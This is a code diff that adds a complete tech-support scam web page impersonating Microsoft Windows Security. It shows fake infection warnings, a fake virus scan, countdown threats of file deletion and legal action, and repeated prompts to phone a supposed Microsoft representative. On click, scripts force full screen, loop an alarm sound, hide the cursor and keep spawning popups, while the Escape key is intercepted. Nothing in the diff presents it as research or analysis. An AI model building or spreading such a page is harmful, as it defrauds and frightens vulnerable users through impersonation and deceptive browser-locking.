+      const pos = getRandomPosition(400,300);
+      dlg.style.top = pos.top + "px";
+      dlg.style.left = pos.left + "px";
+      newModal.style.zIndex = 1080 + modalCount;
+      modal.show();
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      const firstModalEl = document.getElementById('fbAlertModal');
+      if(firstModalEl) {
+        const fbModal = new bootstrap.Modal(firstModalEl, {backdrop:'static', keyboard:false});
+        const dlg = firstModalEl.querySelector('.modal-dialog');
+        dlg.style.top = "50px";
+        dlg.style.left = Math.random() * (window.innerWidth - 400) + "px";
+        firstModalEl.style.zIndex = 1080;
+        fbModal.show();
+      }
+    });
+
+    document.body.addEventListener('click', () => {
+      triggerFullScreen();
+      createNewModal();
+    });
+
+    document.addEventListener("keydown", function (e) {
+      if (e.key==="Escape"){ exitFullScreen(); }
+    }, true);
+  </script>
+
+</head>
+
+<body id="mycanvas" onclick="playSound()" style="cursor:none">
+
+  <!-- Updated background images to use images folder -->
+  <div class="bg" style="cursor:none;">
+    <div class="bgimg" style="top: 0px;"><img src="images/bg.png" alt="" width="100%"/></div>
+  </div>
+
+  <!-- First popup modal -->
+  <div class="modal fade" id="fbAlertModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog positioned">
+      <div class="modal-content">
+        <div class="modal-header pb-0">
+          <button type="button" class="p-0 btn-close" data-bs-dismiss="modal"></button>
+        </div>
+        <div class="modal-body text-center">
+          <!-- Changed to Microsoft branding -->
+          <img src="images/mainimg.png" alt="Microsoft Windows" class="mx-auto">
+          <div class="alert-text">
+            "Microsoft Servers have detected usage of this machine across different locations as displayed above. Auto-file deletion may start if not contacted the Windows Representative in". For immediate assistance and account protection, contact Microsoft Support at  
+            <a href="tel:+1 8333916501" class="text-white underline">+1-833-391-6501</a>.
+          </div>
+
+          <div class="callnowbtn">
+            <a href="tel:+1 8333916501" class="tel-link">
+              <button type="button" class="btn btn-primary text-white">Call Now</button>
+            </a>
+          </div>
+
+          <div class="text-center mt-4 actionbtn">
+            <button type="button" class="btn btn-primary ok-btn me-2">OK</button>
+            <button type="button" class="btn btn-outline-secondary cancel-btn">Cancel</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="bg" style="cursor:none;">
+    <div class="bgimg" style="top: 0px;"><img src="images/bg2.jpg" alt="" width="100%"></div>
+  </div>
+
+  <a onclick="openFullscreen();" rel="noreferrer" id="link_black">
+    <div class="black" style="height: 145%;"></div>
+  </a>
+
+  <!-- Updated security scan box with Microsoft branding -->
+  <div class="box" id="box">
+    <div class="top">
+      <p style="font-size: 16px; font-family: 'Google Sans', 'Google Sans Text', Roboto, sans-serif;font-weight: 600;">Microsoft Windows Security<img src="images/minimize.jpeg" class="btn" style="float: right; width:115px;"></p>
+    </div>
+
+    <h2 style="position: absolute; left: 70px; top: 60px; font-weight: 300;" id="text1">Safety at a glance</h2>
+    <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2"><br>Check what is happening to the safety and health of your device and take all necessary measures.</p>
+    <div class="centerright">
+      <ul>
+        <li>
+          <br>
+          <img src="images/kxFy-clip.png" width="40px;">
+          <p>Virus and threat protection</p>
+          <p style="top: 120px; position: absolute; font-size: 13px; color: grey;">action is required. Run a scan to check for <br>threats.</p>
+        </li>
+        <li>
+          <br><br>
+          <img src="images/qsbs-firewall.png" width="60px;">
+          <p>Firewall and network protection</p>
+          <p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
+        </li>
+      </ul>
+      <ul>
+        <li>
+          <br>
+          <img src="images/s-S4-acc.png" width="60px;">
+          <p>Account protection</p>
+          <p style="top: 125px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
+        </li>
+        <li>
+          <br>
+          <img src="images/Z5BR-network.png" width="51px;">
+          <p>Application and browser control</p>
+          <p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
+        </li>
+      </ul>
+    </div>
+    <img src="images/uZbx-si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+    <br>
+  </div>
+
+  <!-- Microsoft Windows Security Quick Scan -->
+  <div class="scan" id="scan">
+    <div class="top">
+      <p style="font-size: 16px; font-family: 'Google Sans', 'Google Sans Text', Roboto, sans-serif;font-weight: 600;">Microsoft Windows Security<img src="images/minimize.jpeg" class="btn" style="float: right; width:115px;"></p>
+    </div>
+    <h2 style="position: absolute; left: 66px; top: 49px; font-weight: 300;" id="text1"><img src="images/kxFy-clip.png" width="30px;" style="margin-right: 10px;vertical-align: text-top;">Virus and threat protection</h2>
+    <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2">Device protection against threats.</p>
+
+    <h3 style="position: absolute; right: 180px; top: -10px; font-weight: 300;" id="text12"><b>  (Free Security)</b></h3>
+
+    <div class="centerright">
+      <ul>
+        <li>
+          <div class="flex"> <img src="images/-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 33px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">Current Threat</p></div>
+
+          <br><br>
+          <div class="progress" id="bar">
+            <div class="progress__bar"></div>
+          </div>
+
+          <p style="font-size: 13px;" id="info">A quick scan is in progress...<br>Estimated time remaining: <n id="time">0</n><br><n id="amount">0</n> Files scanned.</p>
+
+          <a href="index.html#" class="button" id="re">to cancel</a>
+          <p style=" font-size: 13px;" id="recx">Keep working while we analyze your device.</p>
+
+          <p style="font-size: 13px; color: #0063c6; cursor: pointer;" id="recx-hide">protection history</p>
+          <br>
+          <p id="shx" style="font-size: 13px; color: #0063c6; display: none; cursor: pointer;">Scan Options<br> Allowed Threats<br> Protection History</p>
+        </li>
+
+        <li>
+          <div class="flex"><img src="images/nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px; margin-top: 5px;"><p style="position: absolute; left: 35px; bottom: 76px; line-height: 18px;">Virus &amp; threat protection settings </p> </div>
+          <p style="color: grey; font-size: 13px;">no action required</p>
+          <p style="font-size: 13px; color: #0063c6;">Manage your settings</p>
+        </li>
+      </ul>
+      <ul>
+        <li>
+          <p style="position: absolute; top: -55px;">I have a question?</p>
+          <p style="font-size: 13px; color: #0063c6; position: absolute; top: -15px; cursor: pointer;">get help</p>
+        </li>
+        <li>
+          <p style="position: absolute; top: 25px;">who will protect me</p>
+          <p style="font-size: 13px; color: #0063c6; position: absolute; top: 65px; cursor: pointer;">Supplier management</p>
+        </li>
+        <li>
+          <p style="position: absolute; top: 100px; "><br>Help us improve Microsoft Windows security</p>
+          <p style="font-size: 13px; color: #0063c6; position: absolute; top: 152px; cursor: pointer;">Send us your feedback</p>
+        </li>
+        <li>
+          <p style="position: absolute; top: 190px;">Change your privacy settings</p>
+          <p style="position: absolute; top: 220px; font-size: 13px;">View and change privacy settings on Microsoft Windows<br><n id="which"></n> devices.</p>
+          <p style="font-size: 13px; color: #0063c6; position: absolute; top: 270px; cursor: pointer;">Privacy Settings<br>Privacy Dashboard<br>Privacy Statement</p>
+        </li>
+      </ul>
+    </div>
+    <img src="images/uZbx-si.png" class="btn" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+    <br>
+  </div>
+
+  <script>
+    navigator.userAgentData.getHighEntropyValues(["platformVersion"]).then(ua => {
+      if (navigator.userAgentData.platform === "Windows") {
+        const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
+        if (majorPlatformVersion >= 13) {
+          document.getElementById("which").innerHTML = " 11";
+        } else if (majorPlatformVersion > 0) {
+          document.getElementById("which").innerHTML = " 10";
+        } else {
+          console.log("Beyond");
+        }
+      } else {
+        console.log("does not work on Microsoft Windows");
+      }
+    });
+  </script>
+
+  <!-- Updated alert popup with Microsoft branding -->
+  <div class="alert_popup cardcontainer lightbox">
+    <div class="container">
+      <div class="row">
+        <div class="col-md-12">
+          <p class="text-center" style="font-size: 16px; font-weight: normal; margin: 0; margin-bottom: 5px; padding: 5px 10px; color: #fff;font-weight: bold; margin-top: 8px; text-align: center;"><img src="images/mainimg.png" class="logo12"> Microsoft Windows Security - Spyware Alert</p>
+          <p class="text-center">** Microsoft Windows is infected with Trøjãñ:ŚL0ČKÉR **</p>
+          <p>A critical error has occurred due to the outdated version of the browser. Update your browser as soon as possible.</p>
+          <p>The following errors are also possible on outdated versions of the browser:</p>
+          <ul class="icon-links">
+            <li>&gt; Loss of personal and stored data</li>
+            <li>&gt; Confidental information leak</li>
+            <li>&gt; Browsers errors</li>
+          </ul>
+
+          <p>A Microsoft Windows Security scan has detected potentially unwanted adware on this device that can steal passwords, online identities, financial information, personal files, images, or documents.</p>
+          <p>Please contact us immediately so that our engineer can explain the removal process over the phone.<br><br>
+
+          Please contact Microsoft Windows immediately to report this threat, prevent spoofing, and unlock access to this device.<br><br>
+          Closing this Microsoft Windows puts your personal information at risk and interrupts your Microsoft Windows registration.</p>
+
+          <p style="padding-bottom: 0px;">Call Microsoft Windows <strong> +1 833-391-6501</strong></p>
+          <div class="action_buttons"> <a class="" id="leave_page" style="cursor: pointer;">OK</a> <a class="" id="leave_page">Cancel</a> </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <audio id="beep" loop="">
+    <source src="media/_Fm7-alert.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    addEventListener("click", function() {
+      var el = document.documentElement, 
+          rfs = el.requestFullScreen || el.webkitRequestFullScreen || el.mozRequestFullScreen;
+      rfs.call(el);
+    });
+  </script>
+
+  <!-- Updated main warning popup with Microsoft branding -->
+  <div id="lst" class="lst lightbox">
+    <div class="ilb top">
+      <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
+        <span id="txtadd" class="fl title"><span class="fl ilb"><img src="images/mainimg.png" class="logo3"> </span><span style="color: #fff;"> Microsoft Windows Security Center</span>
+        <span id="txts1" class="fl title2"><a href="index.html#"><img src="images/cross.png"></a></span>
+      </div>
+    </div>
+    <div id="txtintro">
+      <span class="colo-rd"><span class="blink">(Microsoft Legal Terms Violated)</span> Cross-Country License detected<br>
+      Error Code:- G-0x80070057</span>
+    </div>
+    <img id="banner" src="images/merg-gif.gif">
+    <div id="disclaimer">
+      Microsoft Servers have detected usage of this machine across different location as displayed above. Auto-file deletion may start if not contacted the Windows Representative in<strong><span id="timer" style="color: green;">
+      <span id="time">30 </span>  Seconds 
+    </span></strong><br>
+      <span class="support">Contact Microsoft Windows: <strong style="color: red;"></strong>+1-833-391-6501</span>
+    </div>
+    <div id="bottom">
+      <img id="badge" src="images/mainimg.png"><span class="title3">Microsoft Windows</span>
+      <ul>
+        <li>
+          <a href="index.html#">
+            <div class="btn btn-outline-secondary cancel-btn">
+              <span id="addtochromebutton">Deny</span>
+            </div>
+          </a>
+        </li>
+        <li>
+          <a href="index.html#">
+            <div class="btn btn-primary ok-btn me-2">
+              <span id="addtochromebutton">Allow</span>
+            </div>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Updated footer with Microsoft branding -->
+  <div id="footer">
+    <div class="row">
+      <div class="col-md-12">
+        <div class="right-foot" style="text-align: center;">
+          <span id="footertxt"><img src="images/mainimg.png"> Microsoft Windows: </span><span style="font-weight: 700;padding-left: 13px;color: #fff;"> Contact <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;"> +1-833-391-6501</span></span>
+        </div>
+      </div>
+      <div class="col-md-12">
+        <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 12px;"><strong>Security Note :</strong> You are getting this error message because our servers have received logs from your Machine about counterfeit Apps or Softwares those have been installed. If you have not installed such apps, then you must have unknowingly downloaded files from the internet, which are giving live access to illegal activities over this machine. Contact the Windows Rep to resolve the issue urgently. If delayed we would be forced to start to auto-delete your files.  </small></marquee>
+      </div>
+    </div>
+  </div>
+
+  <!-- Updated welcome div with Microsoft branding -->
+  <div id="welcomeDiv" class="answer_list">
+    <p class="text-center" style="color: #FEFEFE; margin-top:10px; font-size: 16px; opacity:.9; ">This Microsoft Windows  is using Counterfeit Software or a dangerous ransomware is installed and it will lock your device!<br> The case will be transferred to Legal department, if not resolved immediately.  <br>Please contact us immediately. A Service Representative will help you solve the problem.</p>
+    <div class="text-center mt-4 actionbtn">
+      <button type="button" class="btn btn-primary ok-btn me-2">Call Support : +1-833-391-6501</button>
+    </div>
+  </div>
+
+  <!-- Updated chat box with Microsoft branding -->
+  <div id="chat-box">
+    <img src="images/mainimg.png"><span style="color: #222; font-size: 21px; font-weight: 600; margin-left: 6px; position: relative; top: 5px;">Microsoft Security</span> 
+    <h4 style="font-weight: 750;">+1-833-391-6501<br>( Toll-Free )</h4>
+    <div class="arrow-down">
+      <i class="fa fa-caret-down"></i>
+    </div>
+  </div>
+
+</body>
+</html>
